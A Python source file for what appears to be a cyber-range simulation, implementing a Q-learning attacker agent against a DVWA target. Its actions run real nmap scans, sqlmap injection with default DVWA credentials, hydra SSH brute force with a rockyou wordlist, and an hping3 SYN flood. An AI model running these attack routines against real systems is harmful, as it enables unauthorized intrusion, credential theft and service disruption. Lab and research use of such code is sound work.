"""
Attacker AI Agent with Reinforcement Learning
Implements Q-learning to learn optimal attack strategies
"""

import numpy as np
import sys
import os
sys.path.append('/opt/cyber-sim/shared')

from config import *
from utils import setup_logging, check_connectivity, execute_command, save_metrics
import time
import random
import json
from typing import Dict, List, Tuple, Any
import pickle


class AttackerEnvironment:
    """Environment that the attacker interacts with"""

    def __init__(self, target_ip: str, logger):
        self.target_ip = target_ip
        self.logger = logger
        self.current_state = self._get_initial_state()
        self.attack_history = []
        self.blocked = False
        self.detected_count = 0

    def _get_initial_state(self) -> np.ndarray:
        """Get initial state observation"""
        return np.array([0.0] * ATTACKER_STATE_SPACE)

    def _scan_target(self) -> Dict[str, Any]:
        """Perform network scan on target"""
        self.logger.info(f"Scanning target {self.target_ip}")

        # Quick TCP SYN scan on common ports
        result = execute_command([
            'nmap', '-sS', '-T4', '--top-ports', '100',
            '-Pn', self.target_ip
        ], timeout=60)

        open_ports = []
        if result['success']:
            for line in result['stdout'].split('\n'):
                if '/tcp' in line and 'open' in line:
                    port = line.split('/')[0].strip()
                    try:
                        open_ports.append(int(port))
                    except:
                        pass

        return {
            'success': len(open_ports) > 0,
            'open_ports': open_ports,
            'port_count': len(open_ports)
        }

    def _sql_injection_attack(self) -> Dict[str, Any]:
        """Perform SQL injection attack on DVWA"""
        self.logger.info(f"Attempting SQL injection on {self.target_ip}")
        try:
            import requests
            session = requests.Session()
        
            # Get CSRF token from login page
            login_url = f"http://{self.target_ip}/DVWA/login.php"
            r = session.get(login_url)
        
            import re
            token_match = re.search(r"user_token.*?value='([a-f0-9]+)'", r.text)
            token = token_match.group(1) if token_match else ''
        
            # Login with CSRF token
            session.post(login_url, data={
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                'user_token': token
            })
        
            # Get real session cookie
            phpsessid = session.cookies.get('PHPSESSID', 'test')
            cookie = f"security=low; PHPSESSID={phpsessid}"
        
            dvwa_url = f"http://{self.target_ip}/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
            result = execute_command([
                'sqlmap', '-u', dvwa_url,
                '--cookie', cookie,
                '--batch', '--risk=1', '--level=1',
                '--technique=U', '--threads=5'
            ], timeout=120)
        
            success = 'vulnerable' in result['stdout'].lower() or \
                      'injectable' in result['stdout'].lower() or \
                      'sqlmap identified' in result['stdout'].lower()
            return {
                'success': success,
                'details': 'SQL injection successful' if success else 'Failed'
            }
        except Exception as e:
            return {'success': False, 'details': str(e)}

    def _brute_force_attack(self) -> Dict[str, Any]:
        """Perform brute force attack on SSH"""
        self.logger.info(f"Attempting brute force on {self.target_ip}")
        
        try:
            # Use hydra for SSH brute force with small wordlist
            result = execute_command([
                'hydra', '-l', 'admin', '-P', '/usr/share/wordlists/rockyou.txt',
                '-t', '4', '-vV', '-f',
                f'ssh://{self.target_ip}'
            ], timeout=90)
            
            success = 'password:' in result['stdout'].lower() or 'valid' in result['stdout'].lower()
            
            return {
                'success': success,
                'details': 'Credentials found' if success else 'Failed'
            }
        except Exception as e:
            self.logger.error(f"Brute force error: {e}")
            return {'success': False, 'details': str(e)}
    
    def _ddos_attack(self) -> Dict[str, Any]:
        """Perform simple DDoS simulation"""
        self.logger.info(f"Simulating DDoS on {self.target_ip}")
        
        try:
            # Use hping3 for SYN flood simulation
            result = execute_command([
                'hping3', '-S', '-p', '80', '--flood',
                '--rand-source', '-c', '1000', self.target_ip
            ], timeout=30)
            
            success = result['returncode'] == 0
            
            return {
                'success': success,
                'details': 'DDoS packets sent' if success else 'Failed'
            }
        except Exception as e:
            self.logger.error(f"DDoS error: {e}")
            return {'success': False, 'details': str(e)}
    
    def execute_action(self, action: int) -> Tuple[np.ndarray, float, bool]:
        """Execute an attack action and return next state, reward, done"""
        reward = 0
        done = False
        
        # Check if blocked
        if not check_connectivity(self.target_ip, APACHE_PORT, timeout=2):
            self.logger.warning("Attacker appears to be blocked")
            self.blocked = True
            reward = ATTACKER_REWARDS['blocked']
            done = True
            return self._get_current_state(), reward, done
        
        # Execute action
        if action == ATTACK_TYPES['IDLE']:
            self.logger.info("Attacker idle")
            reward = ATTACKER_REWARDS['idle']
            result = {'success': False}
            
        elif action == ATTACK_TYPES['SCAN']:
            result = self._scan_target()
            if result['success']:
                reward = ATTACKER_REWARDS['successful_scan']
                self.current_state[0] = result['port_count']  # Update open ports count
            
        elif action == ATTACK_TYPES['SQL_INJECTION']:
            result = self._sql_injection_attack()
            if result['success']:
                reward = ATTACKER_REWARDS['successful_sql_injection']
                self.current_state[1] += 1  # Increment successful attacks
            
        elif action == ATTACK_TYPES['BRUTE_FORCE']:
            result = self._brute_force_attack()
            if result['success']:
                reward = ATTACKER_REWARDS['successful_brute_force']
                self.current_state[1] += 1
            
        elif action == ATTACK_TYPES['DDOS']:
            result = self._ddos_attack()
            if result['success']:
                reward = ATTACKER_REWARDS['successful_ddos']
                self.current_state[1] += 1
        
        # Record attack
        self.attack_history.append({
            'action': action,
            'result': result,
            'reward': reward,
            'timestamp': time.time()
        })
        
        # Small delay to allow IDS to process
        time.sleep(2)
        
        # Check if detected (simplified - could query defender API)
        if random.random() < 0.3 and result.get('success', False):
            self.detected_count += 1
            self.current_state[2] = self.detected_count
            reward += ATTACKER_REWARDS['detected']
        
        return self._get_current_state(), reward, done
    
    def _get_current_state(self) -> np.ndarray:
        """Get current state observation"""
        # Feature engineering
        state = [
            self.current_state[0],  # open_ports_count
            self.current_state[1],  # previously_successful_attacks
            self.detected_count,     # times_detected
            1 if self.blocked else 0,  # times_blocked
            0,  # current_firewall_rules (would query defender)
            self._measure_response_time(),  # target_response_time
            self._calculate_vulnerability_score()  # vulnerability_score
        ]
        return np.array(state)
    
    def _measure_response_time(self) -> float:
        """Measure target response time"""
        start = time.time()
        check_connectivity(self.target_ip, APACHE_PORT, timeout=1)
        return time.time() - start
    
    def _calculate_vulnerability_score(self) -> float:
        """Calculate vulnerability score based on discoveries"""
        score = 0
        if self.current_state[0] > 0:  # Open ports found
            score += 0.3
        if self.current_state[1] > 0:  # Successful attacks
            score += 0.5
        if not self.blocked:
            score += 0.2
        return min(score, 1.0)
    
    def reset(self) -> np.ndarray:
        """Reset environment for new episode"""
        self.current_state = self._get_initial_state()
        self.attack_history = []
        self.blocked = False
        self.detected_count = 0
        return self._get_current_state()


class QLearningAgent:
    """Q-Learning Agent for Attacker"""
    
    def __init__(self, state_space: int, action_space: int, logger):
        self.state_space = state_space
        self.action_space = action_space
        self.logger = logger
        
        # Q-table
        self.q_table = np.zeros((100, action_space))  # Discretized states
        
        # Hyperparameters
        self.learning_rate = RL_CONFIG['learning_rate']
        self.discount_factor = RL_CONFIG['discount_factor']
        self.epsilon = RL_CONFIG['epsilon_start']
        self.epsilon_min = RL_CONFIG['epsilon_end']
        self.epsilon_decay = RL_CONFIG['epsilon_decay']
        
        # Training metrics
        self.episode_rewards = []
        self.episode_lengths = []
        
    def _discretize_state(self, state: np.ndarray) -> int:
        """Discretize continuous state to index"""
        # Simple binning strategy
        state_hash = int(np.sum(state * np.array([10, 5, 20, 50, 1, 100, 10])) % 100)
        return state_hash
    
    def choose_action(self, state: np.ndarray) -> int:
        """Choose action using epsilon-greedy policy"""
        if random.random() < self.epsilon:
            # Explore
            return random.randint(0, self.action_space - 1)
        else:
            # Exploit
            state_idx = self._discretize_state(state)
            return np.argmax(self.q_table[state_idx])
    
    def update(self, state: np.ndarray, action: int, reward: float, 
               next_state: np.ndarray, done: bool):
        """Update Q-table using Q-learning update rule"""
        state_idx = self._discretize_state(state)
        next_state_idx = self._discretize_state(next_state)
        
        # Q-learning update
        current_q = self.q_table[state_idx, action]
        
        if done:
            target_q = reward
        else:
            max_next_q = np.max(self.q_table[next_state_idx])
            target_q = reward + self.discount_factor * max_next_q
        
        # Update Q-value
        self.q_table[state_idx, action] += self.learning_rate * (target_q - current_q)
    
    def decay_epsilon(self):
        """Decay exploration rate"""
        self.epsilon = max(self.epsilon_min, self.epsilon * self.epsilon_decay)
    
    def save_model(self, filepath: str):
        """Save Q-table to file"""
        with open(filepath, 'wb') as f:
            pickle.dump({
                'q_table': self.q_table,
                'epsilon': self.epsilon,
                'episode_rewards': self.episode_rewards,
                'episode_lengths': self.episode_lengths
            }, f)
        self.logger.info(f"Model saved to {filepath}")
    
    def load_model(self, filepath: str):
        """Load Q-table from file"""
        if os.path.exists(filepath):
            with open(filepath, 'rb') as f:
                data = pickle.load(f)
                self.q_table = data['q_table']
                self.epsilon = data['epsilon']
                self.episode_rewards = data['episode_rewards']
                self.episode_lengths = data['episode_lengths']
            self.logger.info(f"Model loaded from {filepath}")
            return True
        return False


class AttackerAI:
    """Main Attacker AI Controller"""
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.logger = setup_logging('attacker_ai')
        
        self.env = AttackerEnvironment(target_ip, self.logger)
        self.agent = QLearningAgent(ATTACKER_STATE_SPACE, ATTACKER_ACTION_SPACE, self.logger)
        
        self.model_path = '/opt/cyber-sim/attacker/models/q_table.pkl'
        os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
        
        self.logger.info(f"Attacker AI initialized targeting {target_ip}")

    @property
    def epsilon(self):
        """Expose agent's epsilon for simulation engine metrics"""
        return self.agent.epsilon

    def decay_epsilon(self):
        """Decay exploration rate of the underlying agent"""
        self.agent.decay_epsilon()

    def save_model(self):
        """Save the agent's Q-table"""
        self.agent.save_model(self.model_path)

    def _flatten_obs(self, observation):
        """Flatten observation dict into a fixed-length numpy array"""
        flat = []
        for v in observation.values():
            if isinstance(v, (list, tuple)):
                flat.append(float(len(v)))   # use count of open ports, not the list itself
            elif isinstance(v, bool):
                flat.append(float(v))
            elif isinstance(v, dict):
                flat.append(float(len(v)))
            else:
                try:
                    flat.append(float(v))
                except (TypeError, ValueError):
                    flat.append(0.0)
        return np.array(flat, dtype=float)

    def choose_action(self, observation):
        """Choose action and return as string name for simulation engine"""
        state = self._flatten_obs(observation)
        action_int = self.agent.choose_action(state)
        # Map integer back to string name expected by simulation_engine
        action_map = {
            0: 'idle',
            1: 'scan',
            2: 'sqli',
            3: 'brute_force',
            4: 'ddos'
        }
        return action_map.get(action_int, 'idle')

    def update_q_table(self, obs, action, reward, next_obs):
        """Update the agent's Q-table"""
        action_map = {'idle': 0, 'scan': 1, 'sqli': 2, 'brute_force': 3, 'ddos': 4}
        action_int = action_map.get(action, 0) if isinstance(action, str) else action
        state      = self._flatten_obs(obs)
        next_state = self._flatten_obs(next_obs)
        self.agent.update(state, action_int, reward, next_state, done=False)

    def train(self, episodes: int = None):
        """Train the attacker agent"""
        if episodes is None:
            episodes = RL_CONFIG['episodes']
        
        self.logger.info(f"Starting training for {episodes} episodes")
        
        for episode in range(episodes):
            state = self.env.reset()
            episode_reward = 0
            step = 0
            done = False
            
            while not done and step < RL_CONFIG['max_steps_per_episode']:
                # Choose and execute action
                action = self.agent.choose_action(state)
                next_state, reward, done = self.env.execute_action(action)
                
                # Update agent
                self.agent.update(state, action, reward, next_state, done)
                
                # Update tracking
                episode_reward += reward
                state = next_state
                step += 1
                
                # Log progress
                action_name = [k for k, v in ATTACK_TYPES.items() if v == action][0]
                self.logger.debug(f"Episode {episode+1}, Step {step}: "
                                f"Action={action_name}, Reward={reward:.2f}")
            
            # Episode complete
            self.agent.episode_rewards.append(episode_reward)
            self.agent.episode_lengths.append(step)
            self.agent.decay_epsilon()
            
            # Log episode summary
            self.logger.info(f"Episode {episode+1}/{episodes} complete: "
                           f"Total Reward={episode_reward:.2f}, "
                           f"Steps={step}, "
                           f"Epsilon={self.agent.epsilon:.4f}")
            
            # Save metrics
            save_metrics({
                'episode': episode + 1,
                'total_reward': episode_reward,
                'steps': step,
                'epsilon': self.agent.epsilon,
                'avg_reward_last_10': np.mean(self.agent.episode_rewards[-10:]) if len(self.agent.episode_rewards) >= 10 else episode_reward
            }, METRICS_FILE)
            
            # Save model periodically
            if (episode + 1) % 50 == 0:
                self.agent.save_model(self.model_path)
            
            # Delay between episodes
            time.sleep(5)
        
        # Final save
        self.agent.save_model(self.model_path)
        self.logger.info("Training complete")
    
    def run_autonomous(self):
        """Run attacker in autonomous mode with learned policy"""
        self.logger.info("Running in autonomous mode")
        
        # Load trained model
        if not self.agent.load_model(self.model_path):
            self.logger.warning("No trained model found, using random policy")
        
        # Set epsilon to minimum for exploitation
        # self.agent.epsilon = self.agent.epsilon_min  # disabled for real mode
        
        while True:
            state = self.env.reset()
            done = False
            step = 0
            
            while not done and step < RL_CONFIG['max_steps_per_episode']:
                action = self.agent.choose_action(state)
                next_state, reward, done = self.env.execute_action(action)
                
                action_name = [k for k, v in ATTACK_TYPES.items() if v == action][0]
                self.logger.info(f"Step {step}: Action={action_name}, Reward={reward:.2f}")
                
                state = next_state
                step += 1
                
                time.sleep(10)  # Delay between actions
            
            time.sleep(30)  # Delay between episodes


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Attacker AI Agent')
    parser.add_argument('--mode', choices=['train', 'run'], default='train',
                       help='Mode: train or run')
    parser.add_argument('--episodes', type=int, default=None,
                       help='Number of training episodes')
    parser.add_argument('--target', default=TARGET_IP,
                       help='Target IP address')
    
    args = parser.parse_args()
    
    attacker = AttackerAI(args.target)
    
    if args.mode == 'train':
        attacker.train(args.episodes)
    else:
        attacker.run_autonomous()


if __name__ == '__main__':
    main()
